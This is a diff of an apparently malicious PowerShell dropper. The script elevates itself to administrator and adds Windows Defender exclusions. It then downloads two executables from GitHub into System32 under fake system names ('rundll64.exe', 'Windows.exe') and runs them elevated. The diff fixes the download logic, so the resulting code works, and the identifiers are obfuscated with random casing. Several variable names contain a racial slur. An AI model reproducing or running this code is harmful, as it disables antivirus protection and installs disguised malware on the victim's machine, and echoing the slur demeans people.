@@ -1,41 +1,41 @@
-if (!([securITy.pRINCiPal.WINDOWspRinCIpal][SEcuRity.PrinCiPAl.WInDowsiDEnTITy]::GetCurrent()).IsInRole([sECuRITy.PRincipAl.wiNDowsBuilTInrolE] "Administrator")) {
- Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$psCOMmaNDPAtH`"" -Verb RunAs
-       exit
+if (!([SECURITy.PrInCipAl.WindOwSpRinCIpal][SECurItY.prInciPAL.wiNdOwSIdenTiTy]::GetCurrent()).IsInRole([SECURiTY.pRIncipAL.WinDoWSBuiltInrOlE] "Administrator")) {
+   Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PsCOmMANdpATh`"" -Verb RunAs
+        exit
 }
 
 Add-MpPreference -ExclusionPath "C:\Windows\System32\Dism"
 Add-MpPreference -ExclusionProcess "C:\Windows\System32\rundll64.exe"
 Add-MpPreference -ExclusionProcess "C:\Windows\System32\Windows.exe"
 
-$tuFfUrl = "https://github.com/totowii/meow/raw/refs/heads/main/rundll64.exe"
-$TufFpaTh = "C:\Windows\System32\rundll64.exe"
+$TuffuRl = "https://github.com/totowii/meow/raw/refs/heads/main/rundll64.exe"
+$TuFfpaTh = "C:\Windows\System32\rundll64.exe"
 
 Write-Host "Downloading..." -ForegroundColor Cyan
 
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFileAsync($exeurL, $EXEpath)
+$WC = New-Object System.Net.WebClient
+$WC.DownloadFileAsync($TuffuRl, $TuFfpaTh)
 
-while ($wc.IsBusy) {
-Start-Sleep -Milliseconds 1000
+while ($WC.IsBusy) {
+         Start-Sleep -Milliseconds 1000
 }
 
-$niGgeRURl = "https://github.com/RollbakIsOnline/Puls/raw/refs/heads/main/Windows.exe"
-$NiGGErpaTh = "C:\Windows\System32\Windows.exe"
+$NIGgEruRL = "https://github.com/RollbakIsOnline/Puls/raw/refs/heads/main/Windows.exe"
+$nigGeRpAth = "C:\Windows\System32\Windows.exe"
 
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFileAsync($tuFfUrl, $TufFpaTh, $niGgeRURl, $NiGGErpaTh)
+$WC = New-Object System.Net.WebClient
+$WC.DownloadFileAsync($NIGgEruRL, $nigGeRpAth)
 
-while ($wc.IsBusy) {
-     Start-Sleep -Milliseconds 1000
+while ($WC.IsBusy) {
+      Start-Sleep -Milliseconds 1000
 }
 
-if (Test-Path $TufFpaTh) {
-      Write-Host "Completed..." -ForegroundColor Green
-    Start-Process $TufFpaTh -Verb RunAs
+if (Test-Path $TuFfpaTh) {
+   Write-Host "Completed..." -ForegroundColor Green
+     Start-Process $TuFfpaTh -Verb RunAs
 } else {
          Write-Host "Download failed..." -ForegroundColor Red
 }
 
-if (Test-Path $NiGGErpaTh) {
-  Start-Process $NiGGErpaTh -Verb RunAs
+if (Test-Path $nigGeRpAth) {
+     Start-Process $nigGeRpAth -Verb RunAs
 }
